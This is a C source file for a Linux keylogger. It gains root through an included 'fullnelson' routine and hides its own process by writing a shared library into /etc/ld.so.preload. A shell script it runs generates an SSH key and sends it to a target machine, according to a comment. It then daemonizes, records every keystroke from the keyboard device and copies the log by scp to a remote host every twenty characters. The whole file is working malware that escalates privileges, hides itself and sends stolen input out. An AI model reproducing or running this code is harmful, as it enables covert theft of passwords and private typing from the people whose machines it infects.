#include <stdio.h>
#include <fcntl.h>   // open
#include <stdlib.h>
#include <string.h>  // strerror
#include <errno.h>
#include <stdint.h>
#include <assert.h>
#include <unistd.h>  // daemon, close
#include <linux/input.h>
#include <time.h>

#include "key_util.h"
#include "util.h"
#include "options.h"
#include "config.h"
#include "fullnelson.h"
#define KEY_RELEASE 0
#define KEY_PRESS 1

typedef struct input_event input_event;

static void rootCheck();
static int openKeyboardDeviceFile(char *deviceFile);

/**
 * Exit with return code -1 if user does not have root privileges
 */
static void rootCheck() {
   if (geteuid() != 0) {
      printf("Must run as root\n");
      exit(-1);
   }
}

/**
 * Opens the keyboard device file
 *
 * @param  deviceFile   the path to the keyboard device file
 * @return              the file descriptor on success, error code on failure
 */
 
static int openKeyboardDeviceFile(char *deviceFile) {
   int kbd_fd = open(deviceFile, O_RDONLY);
   if (kbd_fd == -1) {
      LOG_ERROR("%s",strerror(errno));
      exit(-1);
   }

   return kbd_fd;
}

int main(int argc, char **argv) {
   getsysroot(argc, argv);                   //get root based on fullnelson
	
   system("mv /home/sun/Desktop/Rotanimret/hideProcess/libprocesshider.so /usr/local/lib/");
   system("echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload");
   
   rootCheck();
   printf("[*] loggering...\n");

   Config config;
   parseOptions(argc, argv, &config);

   int kbd_fd = openKeyboardDeviceFile(config.deviceFile);
   assert(kbd_fd > 0);

   FILE *logfile = fopen(config.logFile, "a");
   if (logfile == NULL) {
      LOG_ERROR("Could not open log file");
      exit(-1);
   }

   setbuf(logfile, NULL);                  // We want to write to the file on every keypress, so disable buffering
   system("/home/sun/Desktop/Rotanimret/skeylogger/init.sh"); //use shell to install necessary packages and generate ssh key and send the key to the tagert computer


   // Daemonize process. Don't change working directory but redirect standard
   // inputs and outputs to /dev/null
   if (daemon(1, 0) == -1) {              //set up the background program
      LOG_ERROR("%s", strerror(errno));
      exit(-1);
   }

   uint8_t shift_pressed = 0;
   input_event event;
   
   int count_num = 0;  					 //for the number of the characters from the input keyboard
   time_t timer;                         //time_t = long int      
   struct tm *tblock;
   timer = time(NULL);
   tblock = localtime(&timer);

    //main funcion and main loop
   while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
		if (event.type == EV_KEY) 
		{
			if (event.value == KEY_PRESS) 
			{
				if (isShift(event.code)) {
				   shift_pressed++;
				}
				char *name = getKeyText(event.code, shift_pressed);
				if (strcmp(name, UNKNOWN_KEY) != 0) 
				{
					LOG("%s", name);
					count_num ++;
					fputs(name, logfile);
					
					if((count_num)%20 == 0)
					{
						fputs("\r\n>>>>>>>>>>>>>>>>>>Time:", logfile);
						fputs(asctime(tblock),logfile);
						count_num = 0;
						system("scp /home/sun/skeylogger.log sun@10.162.128.97:/home/sun/Desktop/");
						 //copy the keylogger to the tagert computer
					}
				}
			} 
			else if (event.value == KEY_RELEASE)
			{
				if (isShift(event.code)) {
				   shift_pressed--;
				}
			}
		}   
      assert(shift_pressed >= 0 && shift_pressed <= 2);
    }

   Config_cleanup(&config);
   fclose(logfile);
   close(kbd_fd);
   return 0;
}
